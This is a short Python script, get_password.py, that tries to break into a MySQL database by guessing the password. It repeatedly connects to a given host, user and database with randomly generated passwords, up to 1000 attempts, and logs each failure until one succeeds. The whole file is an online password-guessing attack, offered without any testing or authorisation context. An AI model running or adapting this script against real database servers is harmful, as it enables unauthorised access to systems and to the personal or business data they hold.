# get_password.py
import string
import random

import mysql
from mysql.connector import Error


def generate_random_password(length=8):
    """Generate a random password of a given length."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))


def test_random_passwords(host, user, database, max_attempts=1000, password_length=8):
    attempts = 0
    while attempts < max_attempts:
        password = generate_random_password(password_length)
        connection = None
        try:
            connection = mysql.connector.connect(
                host=host,
                user=user,
                password=password,
                database=database
            )
            if connection.is_connected():
                print(f"Success: Password found - {password}")
                return password
        except Error as e:
            print(f"Attempt {attempts + 1}: Failed to connect using password: {password} | Error: {e}")
        finally:
            if connection and connection.is_connected():
                connection.close()
                print("MySQL connection is closed")
        attempts += 1
    print("Password not found after maximum attempts")
    return None
